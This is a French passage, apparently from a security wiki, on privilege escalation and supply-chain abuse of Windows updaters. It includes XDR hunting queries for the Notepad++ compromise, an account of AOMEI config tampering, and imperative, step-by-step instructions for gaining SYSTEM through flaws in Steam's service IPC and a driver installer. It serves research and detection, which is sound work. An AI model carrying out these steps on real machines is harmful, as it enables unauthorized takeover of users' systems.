- Considérer le **sideload d’un binaire signé fourni par l’attaquant** comme un point de pivot pour la détection après téléchargement : déclencher une alerte lorsqu’un EXE signé d’un fournisseur charge une DLL dont le nom provient d’un emplacement extérieur à son chemin d’installation canonique (par ex., Bitdefender chargeant `log.dll` depuis Temp/Downloads), ainsi que lorsqu’un programme de mise à jour dépose/exécute des installateurs depuis un emplacement temporaire avec des signatures ne provenant pas du fournisseur.
- Surveiller les **artefacts propres au malware** observés dans cette chaîne (utiles comme points de pivot génériques) : mutex `Global\Jdhfv_1.0.1`, écritures anormales de `gup.exe` dans `%TEMP%` et étapes d’injection de shellcode pilotées par Lua.
- Notepad++ a répondu en renforçant WinGUp dans la version v8.8.9 et les versions ultérieures : le XML renvoyé est désormais signé (XMLDSig), et les versions récentes exigent la vérification du certificat et de la signature de l’installateur téléchargé au lieu de se fier uniquement au transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideload de <code>log.dll</code> par un EXE signé par Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> lançant un installateur autre que celui de Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Ces schémas s’appliquent à tout updater qui accepte des manifests non signés ou ne vérifie pas l’identité des signataires des installateurs : détournement réseau + installateur malveillant + sideloading avec signature BYO donnent lieu à une exécution de code à distance sous couvert de mises à jour « de confiance ».

### La configuration des notifications comme second déclencheur de mise à jour

Un updater peut utiliser des configurations distantes distinctes pour **préparer du contenu et déclencher son exécution**. Cela nécessite de contrôler les configurations ou leurs réponses ; les rapports n’indiquent pas comment l’accès à leur origine a été obtenu. Dans le cas d’AOMEI, `down_html.ini` définissait une URL d’archive, une version (`thrid`) et un MD5 (`Val`) ; l’attaquant a augmenté la version et modifié l’URL ainsi que la somme de contrôle correspondante. Il s’agit de la [défaillance de la frontière de confiance des métadonnées](#2-hijacking-the-update-channel-to-run-code-as-system) décrite ci-dessus. Le chemin d’exécution supplémentaire passait par `Notifycfg.ini` : ce fichier indiquait à `ABNotify.exe` de charger un `upgrade-now.html` extrait via une URL locale `file:///` dans une WebView. La page accédait automatiquement à un exécutable voisin, que la WebView transmettait au shell système. Le processus enfant héritait des privilèges du notifier ; cela ne l’élevait pas automatiquement au niveau SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google a également signalé un `Notifycfg.ini` altéré comportant plus de 35 000 sections factices répétées, ce qui a contourné le contrôle de version habituel du client. Le rapport n’établit pas l’existence d’un contournement générique de l’analyseur syntaxique. L’attaquant rétablissait les fichiers distants après des fenêtres de cinq à dix minutes ; seuls les clients qui interrogeaient le serveur pendant ces fenêtres recevaient donc la configuration modifiée. Ce canal de notification transportait également un leurre distinct de [coercition WebDAV/NTLM](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion), qui ne nécessitait pas l’exécution de l’archive.<sup>[[18]](#references)</sup>

---
## Amorçage par mémoire partagée vers l’IPC d’un service privilégié

Ne vous arrêtez pas à l’énumération des named pipes. Un broker SYSTEM peut exposer un **file mapping** nommé permissif pour établir la connexion, puis dupliquer des handles de pipe anonymes dans le processus demandeur. Dans la conception de Steam testée, `Global\SteamClientService_SharedMemFile` et `Global\SteamClientService_SharedMemLock` coordonnent la négociation entre le PID du client et l’événement ; le service renvoie deux handles de pipe et les requêtes suivantes, préfixées par leur longueur, utilisent `RunInterface` (`0x01`). La DACL du mapping autorisait les clients de tout niveau d’intégrité. L’objet interne `CSteamServiceWin32` de `steamclient64.dll` fournissait un client pratique : résoudre la variable globale propre à la build, appeler le slot 0 de la vtable `Connect`, puis utiliser les maps d’interface au lieu de réimplémenter la négociation. L’accès à l’IPC n’est qu’un prérequis ; c’est la décision de confiance du gestionnaire privilégié qui détermine s’il y a élévation de privilèges. <sup>[[19]](#references)[[20]](#references)</sup>

### Le manifest signé se transforme en liste d’autorisation périmée d’exécutables

`IClientInstallUtils::AddInstallScriptToWhiteList` (slot 21) vérifie le `kvsignatures` d’un VDF signé, mais enregistre le **chemin d’accès développé de l’exécutable**, et non une identité de fichier immuable. Avec une entrée signée `Run Process` telle que `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe`, fournissez un `%INSTALLDIR%` modifiable par l’utilisateur. Placez un exécutable de remplacement à ce chemin développé exact, puis appelez `RunInstallScript` (slot 22) avec un VDF non signé dont `Process 1` indique le chemin autorisé. L’entrée reste valide jusqu’au redémarrage du service ; dans l’implémentation signalée, le fichier n’est pas revérifié avant le lancement par SYSTEM. Faites correspondre le nom du fichier placé à celui de l’entrée signée réelle, et pas seulement à la catégorie de prérequis. <sup>[[19]](#references)[[20]](#references)</sup>

### Le processus enfant du gestionnaire de modules contourne la vérification de signature du chargement direct

`IClientModuleManager::LoadModule` (slot 0) accepte les octets d’un module lorsque l’ID fourni correspond à leur CRC32. `CallFunctionAsync` (slot 3), avec `flags & 8`, sélectionne une branche **processus enfant** plutôt que la branche de chargement réflexif direct, qui vérifie une signature Valve. Le service écrit `legacycompat\servicecall_<CRC>.dll` et lance `legacycompat\steamservice.exe /runfunc ...` depuis le répertoire d’installation. Si ce répertoire est modifiable par l’utilisateur, placez un exécutable au dernier chemin, chargez n’importe quel module temporaire correspondant au CRC, puis appelez la méthode asynchrone avec le bit 3 activé. Dans la build signalée, l’exécutable enfant et la DLL écrite sur disque n’étaient pas authentifiés. Le module n’a pas besoin d’être lui-même un payload fonctionnel : c’est l’exécutable enfant substitué qui s’exécute en tant que SYSTEM. <sup>[[19]](#references)[[20]](#references)</sup>

### Vérifications des membres du catalogue avant l’installation d’un pilote privilégié

Pour un broker d’installation de pilotes, vérifiez si la validation du catalogue est liée **au fichier INF exact transmis à l’installateur**. Dans le chemin `InstallVrLinkDongleDriver` signalé, `WinVerifyTrust` valide un catalogue et `CryptCATAdminCalcHashFromFileHandle` recherche *au moins un* fichier correspondant dans un répertoire fourni par l’appelant, mais le service exécute ensuite `pnputil /add-driver ... /install` sur `netrtwlanuval.inf` sans établir que cet INF est bien le membre prévu du catalogue. Un répertoire plat ou propre à une architecture est accepté. Un catalogue signé contenant n’importe quel membre correspondant dans le répertoire peut donc passer la vérification faible du service, même si l’INF transmis à l’installateur privilégié est différent. Ne partez pas du principe que cela suffit à contourner la politique de signature des pilotes de Windows : la réussite de l’installation dépend toujours du package de remplacement et de la politique de l’hôte. <sup>[[19]](#references)[[20]](#references)</sup>

Le service libère ses handles de validation avant que `pnputil` ouvre l’INF, ce qui crée une [fenêtre TOCTOU](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk) avec une opération d’installation de pilote comme cible, plutôt qu’une mise à jour d’exécutable. Un oplock permet de synchroniser une substitution entre la vérification et l’ouverture par l’installateur. Le même IPC expose le [transfert de saisie vers le bureau sécurisé](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring), sous réserve de conditions de consentement distinctes. <sup>[[19]](#references)</sup>

## References
- [1] [Avis – Netskope Client pour Windows – Élévation locale de privilèges via un serveur malveillant (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Avis de sécurité Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – client/exploit IPC Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Exploitation d’ASUS DriverHub, MSI Center, Acer Control Centre et Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB : NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Élévation locale de privilèges via des fichiers modifiables dans Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Élévation de privilèges dans l’agent Windows](https://checkmk.com/werk/16361)
- [10] [PoC sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Des acteurs étatiques exploitent la chaîne d’approvisionnement de Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – mise à jour sur l’incident d’infrastructure détournée](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Contournement du correctif de CVE-2025-0309 dans Netskope Client pour Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Découverte de failles d’élévation de privilèges dans Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater : de gRPC à SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – Compromission de la chaîne d’approvisionnement d’AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group et Mandiant – Enquête sur une altération éphémère de la chaîne d’approvisionnement](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis – Exploitation de Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [Atredis – PoC d’exploitation de Valve](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
